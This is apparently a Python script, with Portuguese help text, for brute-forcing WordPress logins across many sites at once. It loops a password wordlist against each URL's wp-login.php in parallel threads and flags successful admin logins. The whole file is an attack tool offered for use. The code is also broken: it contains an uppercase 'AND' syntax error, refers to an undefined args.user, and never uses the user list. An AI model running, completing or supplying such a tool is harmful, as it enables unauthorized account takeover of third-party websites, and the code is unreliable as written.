from multiprocessing.pool import ThreadPool
import requests, os.path, re, argparse


parser = argparse.ArgumentParser(description = 'Massive Wordpress Bruteforce -  Pype')
parser.add_argument('-urls',action='store',dest='URL_LST',required=True,help="Arquivo com as urls")
parser.add_argument('-u',action='store',dest='USR_LST',required=True,help="List de Usuarios")
parser.add_argument('-w',action='store',dest='WRD_LST',required=True,help="Wordlist")
parser.add_argument('-t',action='store',dest='threads',required=True,help="Numero de Threads")
parser.add_argument('-e',action='store',dest='userenum',required=False,help="Enumeracao de Usuario")
parser.add_argument('-p',action='store',dest='passgen',required=False,help="Comutador de senha (Gera senhas baseadas em dados do site")


args = parser.parse_args()

def brute(url):
    b = False
    for pax in PASS:
        crend["pwd"] = pax

        rx = requests.session()
        try:
            r = rx.post("http://"+url+"/wp-login.php",verify=False,timeout=5,data=crend,cookies=coo,headers=UA,allow_redirects=False)
            if r.status_code == 302:
                if "/wp-admin/" in str(r.headers) and "wordpress_logged_in" in str(r.headers):
                    print "\n   [ Login ] %s -> %s:%s\n" % (url, args.user,pax)
                    #print r.headers #debug
                    b = True
                    break
                elif r.headers["Location"][:5] == "https":
                    url = r.headers["Location"]
            elif r.status_code == 200:
                pass
            else:
                break
        except:
            break
        rx.cookies.clear()

    if b == False:
        print "[ FAILED ] %s " % url

def main():
    print ("""
[+] %s URL Loads
[+] %s Words Loads
[+] %s Threads

[+] Starting - good luck
    """) % (len(URLS),len(PASS),args.threads)

    x = ThreadPool(int(args.threads)).imap_unordered(brute, URLS)
    for x in x:
        if not x:
            pass


if __name__ == '__main__':


    if os.path.exists(args.URL_LST) and os.path.exists(args.WRD_LST) AND os.path.exists(args.USR_LST):
        URLS = open(args.URL_LST,"r").read().split()
        PASS = open(args.WRD_LST,"r").read().split()
        USERS = open(args.USR_LST)
        UA = {"User-Agent":"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0"}
        coo = {"wordpress_test_cookie":"WP+Cookie+check"}


        crend = {
            "log":args.user,
            "pwd":"",
            "wp-submit":"Log In",
        }

        main()
    else:
        print ("[-] Arquivos nao encontrados")
